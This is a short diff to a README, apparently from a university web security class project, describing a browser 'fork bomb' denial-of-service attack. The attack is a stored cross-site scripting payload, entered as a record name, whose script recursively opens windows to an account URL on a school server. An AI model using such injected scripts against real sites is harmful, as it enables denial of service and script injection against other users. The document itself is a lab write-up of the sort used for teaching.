@@ -37,7 +37,7 @@
 ### Distributed Denial of Service (DDoS) Attack
 **Fork Bomb:**
 1. Make sure that the browser with the site open will not block popups
-2. Add a new record, using the following as the value for the record name:
+2. Add a new record, using the following as the value for the record name (replace the URL with the current account URL):
 >"&amp;gt;<script>
 function fork() {
   	const win = window.open("http://flip3.engr.oregonstate.edu:6061/user/Kyle&12345");
@@ -45,4 +45,5 @@ function fork() {
 }
 fork(); </script>
 3. Select the name of the record (the code) from the record table
-NOTE: This does not bring down the school server (thankfully) rather it illustrates how to slow down a weak server
+* This does not bring down the school server (thankfully) rather it illustrates how to slow down a weak server
+* The Kyle account has this record already saved and ready to initiate 
